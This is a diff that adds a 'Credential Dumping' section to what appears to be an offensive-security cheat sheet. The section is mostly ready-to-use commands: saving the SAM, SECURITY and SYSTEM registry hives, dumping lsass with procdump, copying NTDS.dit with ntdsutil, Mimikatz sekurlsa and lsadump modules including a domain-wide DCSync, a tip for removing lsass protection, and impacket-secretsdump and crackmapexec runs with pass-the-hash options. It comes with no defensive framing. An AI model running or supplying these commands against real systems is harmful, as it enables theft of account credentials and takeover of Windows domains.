@@ -412,5 +412,83 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name=
 ```
 wmic /NAMESPACE:"\\root\subscription" PATJ __FilterToconsumerBinding CREATE Filter="__EventFilter.Name=\"<NAME>\"", Consumer="CommandLineEventConsumer.Name=\"<NAME>\""
 ```
+### Credential Dumping
+- hashes are stored in three places
+	- SAM -> local user accounts
+	- LSA -> domain user accounts
+	- NTDS.dit -> everyone on domain (only stored on the domain controller)
+- Local password checks
+```
+reg save HKLM\SAM "C:\Windows\Temp\sam.save"
+```
+```
+reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
+```
+```
+reg save HKLM\SYSYSTEM "C:\Windows\Temp\system.save"
+```
+- Task manager
+	- Right click lsass.exe -> create dump file
+```
+procdump -accepteula -ma lsass.exe lsass.dmp
+```
+- Control panel -> user accounts -> Credential manager
+```
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+- Mimikatz (run as administrator)
+```
+token::elevate
+```
+```
+privilege::debug
+```
+```
+#SAM hashes
+lsadump::sam /patch
+```
+```
+#LSA hashes
+lsadump::lsa /patch
+OR
+lsadump::lsa /inject
+```
+```
+#Hashes in LSASS memory
+sekurlsa::msv
+```
+```
+#Hashes for users logged in since last reboot
+sekurlsa::logonpasswords
 
-
+IF YOU SEE THE ERROR !+ !processprotect /process:lsass.exe /remove
+TRY AGAIN
+```
+```
+#Hashes in windows credential manager
+sekurlsa::credman
+```
+```
+#NTDS.dit
+lsadump::dcsync /domain:<DOMAIN> /all /csv
+```
+- Impacket
+```
+impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<HOST>
+```
+```
+impacket-secretsdump <DOMAIN>/<USER>@<HOST> -hashes <HASH>
+```
+```
+#Flags
+-just-dc means only NTDS.dit data (NTLM hashes and kerberos keys)
+-just-dc-ntlm means only NTDS.dit data (NTLM hashes only)
+-sam <SAM_FILE> -system <SYSTEM_FILE> -security <SECURITY_FILE> local dumps directly from the sam
+-ntds <NTDS_FILE> -system <SYSTEM_FILE> -security <SECURITY_FILE> local dumps directly from NTDS
+-no-pass doesnt prompt for password and is used in conjunction with -k
+-k <CCACHE_FILE> used for kerberos ticket
+```
+- Crackmapexec
+```
+crackmapexec smb <HOST> -u <USERNAME> -p <PASSWORD> --<SAM/LSA/NTDS>
+```
